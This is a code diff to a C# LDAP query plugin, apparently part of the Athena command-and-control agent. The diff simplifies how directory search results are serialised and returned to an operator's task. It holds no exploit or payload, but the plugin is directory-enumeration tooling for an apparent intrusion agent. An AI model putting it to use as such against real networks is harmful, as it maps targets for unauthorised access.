@@ -1,12 +1,9 @@
 ﻿using System.DirectoryServices.Protocols;
 using System.Net;
-using System.Runtime.InteropServices;
 using System.Text;
-using System.Linq;
-using System.Net.NetworkInformation;
 using Athena.Commands.Models;
-using Plugin;
 using Athena.Commands;
+using System.Text.Json;
 
 namespace Plugins
 {
@@ -166,7 +163,7 @@ namespace Plugins
                     default: //This also encompasses *
                         if (string.IsNullOrEmpty(ldapFilter))
                         {
-                            ldapFilter = "()";
+                            ldapFilter = "(*=*)";
                         }
                         break;
                 };
@@ -195,24 +192,11 @@ namespace Plugins
 
                 SearchResponse response = (SearchResponse)ldapConnection.SendRequest(request);
 
-                sb.Append("{\"results\": [");
-                if (response.Entries.Count > 0)
-                {
-                    foreach (SearchResultEntry entry in response.Entries)
-                    {
-                        sb.Append("{");
-                        sb.Append(ldapconverter.ConvertLDAPProperty(entry));
-                        sb.Remove(sb.Length - 1, 1);
-                        sb.Append("},");
-                    }
-                    sb.Remove(sb.Length - 1, 1);
-                    sb.Append("] }");
-                }
-                else
-                {
-                    sb.Append("]}");
-                }
-                TaskResponseHandler.WriteLine(sb.ToString(), args["task-id"], true);
+                TaskResponseHandler.WriteLine(JsonSerializer.Serialize(response.Entries), args["task-id"], true);
+            }
+            catch (LdapException e)
+            {
+                TaskResponseHandler.WriteLine(e.ToString(), args["task-id"], true, "error");
             }
             catch (Exception e)
             {
